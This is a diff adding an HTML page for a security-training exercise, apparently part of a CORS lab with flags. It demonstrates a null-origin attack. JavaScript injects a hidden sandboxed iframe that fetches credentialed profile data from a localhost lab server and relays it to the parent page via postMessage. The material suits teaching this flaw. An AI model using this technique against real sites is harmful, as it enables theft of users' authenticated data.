@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ex 01 — Null Origin via Sandboxed iframe</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Courier New', monospace; background: #0a0e1a; color: #e0e6f0; padding: 2rem; }
+    h1 { color: #ff3c3c; margin-bottom: 0.25rem; }
+    .subtitle { color: #6272a4; font-size: 0.85rem; margin-bottom: 2rem; }
+    .scenario {
+      background: #1a1225;
+      border: 1px solid #9945ff44;
+      border-left: 4px solid #9945ff;
+      padding: 1rem 1.25rem;
+      border-radius: 6px;
+      font-size: 0.82rem;
+      line-height: 1.6;
+      margin-bottom: 1.5rem;
+      color: #c0b0e0;
+    }
+    .attack-card {
+      background: #111827;
+      border: 1px solid #1f2d3d;
+      border-radius: 8px;
+      padding: 1.25rem;
+      margin-bottom: 1.25rem;
+    }
+    .attack-card h2 { font-size: 0.95rem; color: #ff6b6b; margin-bottom: 0.5rem; }
+    .badge { background: #ff3c3c22; border: 1px solid #ff3c3c44; color: #ff6b6b; font-size: 0.68rem; padding: 0.15rem 0.5rem; border-radius: 3px; }
+    .explanation { font-size: 0.8rem; color: #6272a4; line-height: 1.6; margin-bottom: 0.75rem; }
+    .null-sources {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 0.6rem 0.75rem;
+      font-size: 0.75rem;
+      margin-bottom: 0.75rem;
+    }
+    .null-sources li { color: #8b949e; margin-left: 1rem; margin-top: 0.2rem; }
+    .null-sources li strong { color: #ff6b6b; }
+    button { background: #ff3c3c22; border: 1px solid #ff3c3c66; color: #ff6b6b; padding: 0.45rem 1.2rem; border-radius: 4px; cursor: pointer; font-size: 0.82rem; font-family: inherit; }
+    button:hover { background: #ff3c3c33; }
+    .output { background: #0d1117; border-radius: 4px; padding: 0.75rem; font-size: 0.75rem; min-height: 90px; white-space: pre-wrap; word-break: break-all; margin-top: 0.75rem; color: #6272a4; border: 1px solid #21262d; }
+    .flag { background: #2d2a00; border: 1px solid #f0c93a55; color: #f0c93a; padding: 0.5rem 0.75rem; border-radius: 4px; margin-top: 0.5rem; font-size: 0.9rem; font-weight: bold; }
+    code { background: #1f2d3d; padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.85em; }
+    .iframe-viz {
+      background: #0d1117;
+      border: 2px dashed #ff3c3c44;
+      border-radius: 6px;
+      padding: 1rem;
+      margin: 0.75rem 0;
+      font-size: 0.75rem;
+      color: #6272a4;
+    }
+    .iframe-viz .label { color: #ff6b6b; margin-bottom: 0.4rem; font-size: 0.8rem; }
+  </style>
+</head>
+<body>
+  <h1>Exercise 01 — Null Origin via Sandboxed iframe</h1>
+  <div class="subtitle">Bug #3 — The origin you send can be "null" — and some servers trust it</div>
+
+  <div class="scenario">
+    <strong>Why this matters:</strong> An attacker embeds a sandboxed iframe anywhere on their page.
+    The iframe's JavaScript sends <code>Origin: null</code> (browsers always do this for sandboxed iframes).
+    If the server trusts <code>null</code> as an origin, the iframe can read the credentialed response —
+    bypassing every hostname-based allowlist entirely.
+  </div>
+
+  <div class="attack-card">
+    <h2><span class="badge">BUG #3</span> Null Origin Trust</h2>
+    <div class="explanation">
+      Browsers send <code>Origin: null</code> in these cases:
+    </div>
+    <div class="null-sources">
+      <ul>
+        <li><strong>Sandboxed iframes</strong> — <code>&lt;iframe sandbox="allow-scripts"&gt;</code></li>
+        <li>Requests from <code>file://</code> URLs</li>
+        <li>Cross-origin redirects (in some browsers)</li>
+        <li>Requests from <code>data:</code> URIs</li>
+      </ul>
+    </div>
+    <div class="explanation">
+      The attack works in two steps. First we show you the raw null-origin request.
+      Then we embed a sandboxed iframe that does the same thing — the way a real attacker would.
+    </div>
+
+    <button onclick="exploitNullDirect()">▶ Step 1 — Send Origin: null directly (fetch trick)</button>
+    <div class="output" id="null-direct-output">Click to run...</div>
+  </div>
+
+  <div class="attack-card">
+    <h2>Sandboxed iframe (the real attack vector)</h2>
+    <div class="explanation">
+      The iframe below has <code>sandbox="allow-scripts"</code>. Its JavaScript will fetch
+      <code>/api/profile</code> and post the result back to this page via <code>postMessage</code>.
+      The browser automatically sends <code>Origin: null</code> from inside the sandbox.
+    </div>
+
+    <div class="iframe-viz">
+      <div class="label">⬇ Sandboxed iframe (invisible to victim, runs silently)</div>
+      <code>&lt;iframe sandbox="allow-scripts" srcdoc="..."&gt;&lt;/iframe&gt;</code><br><br>
+      The iframe sends: <code>Origin: null</code><br>
+      Server responds: <code>Access-Control-Allow-Origin: null</code> + <code>Allow-Credentials: true</code><br>
+      Result: Profile data flows to the attacker's iframe → postMessage → this page
+    </div>
+
+    <button onclick="exploitNullIframe()">▶ Step 2 — Launch sandboxed iframe attack</button>
+    <div class="output" id="null-iframe-output">Click to run...</div>
+  </div>
+
+  <!-- The actual hidden sandboxed iframe gets injected here by JS -->
+  <div id="iframe-container" style="display:none"></div>
+
+  <script>
+    // Step 1: demonstrate what Origin: null looks like in a fetch
+    // (Fetch API doesn't let us set Origin directly — this is illustrative)
+    async function exploitNullDirect() {
+      const el = document.getElementById('null-direct-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Note: Fetch API does not allow setting Origin: null directly.\n' +
+        'Sending request from our origin (' + window.location.origin + ')...\n' +
+        'Watch the Network tab to see the actual Origin header sent.\n\n' +
+        'The sandboxed iframe in Step 2 is the real attack vector.\n\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/profile', { credentials: 'include' });
+        const acao = res.headers.get('access-control-allow-origin');
+        const data = await res.json();
+        el.style.color = '#ff6b6b';
+        el.textContent += 'Response received (our origin was not "null" so null-check may not apply):\n';
+        el.textContent += 'Access-Control-Allow-Origin: ' + acao + '\n\n';
+        el.textContent += JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent += '✅ Blocked from our origin: ' + err.message;
+      }
+    }
+
+    // Step 2: actual sandboxed iframe attack
+    function exploitNullIframe() {
+      const el = document.getElementById('null-iframe-output');
+      el.style.color = '#6272a4';
+      el.textContent = 'Injecting sandboxed iframe...\nWaiting for postMessage from iframe...\n';
+
+      // Listen for the result from the iframe
+      window.addEventListener('message', function handler(event) {
+        window.removeEventListener('message', handler);
+        const result = event.data;
+
+        if (result.success) {
+          el.style.color = '#ff6b6b';
+          el.textContent =
+            '🔥 NULL ORIGIN EXPLOIT SUCCEEDED!\n\n' +
+            'Origin sent by iframe: ' + (result.originSent || 'null') + '\n' +
+            'ACAO header returned: ' + result.acao + '\n\n' +
+            'Profile data exfiltrated from sandboxed iframe:\n' +
+            JSON.stringify(result.data, null, 2);
+
+          if (result.data && result.data.flag) {
+            const f = document.createElement('div');
+            f.className = 'flag';
+            f.textContent = '🚩 FLAG: ' + result.data.flag;
+            el.after(f);
+          }
+        } else {
+          el.style.color = '#3fb950';
+          el.textContent =
+            '✅ Blocked! The null origin was rejected.\n\n' +
+            'Error from iframe: ' + result.error + '\n\nBug #3 has been fixed!';
+        }
+      });
+
+      // Inject the sandboxed iframe
+      const iframeCode = `
+        <script>
+          async function attack() {
+            try {
+              const res = await fetch('http://localhost:3000/api/profile', {
+                credentials: 'include'
+              });
+              const acao = res.headers.get('access-control-allow-origin');
+              const data = await res.json();
+              window.parent.postMessage({
+                success: true,
+                acao: acao,
+                originSent: 'null (set automatically by browser for sandboxed iframes)',
+                data: data
+              }, '*');
+            } catch(e) {
+              window.parent.postMessage({ success: false, error: e.message }, '*');
+            }
+          }
+          attack();
+        <\/script>
+      `;
+
+      const container = document.getElementById('iframe-container');
+      container.innerHTML = '';
+      const iframe = document.createElement('iframe');
+      iframe.setAttribute('sandbox', 'allow-scripts');
+      iframe.setAttribute('srcdoc', iframeCode);
+      iframe.style.display = 'none';
+      container.appendChild(iframe);
+    }
+  </script>
+</body>
+</html>
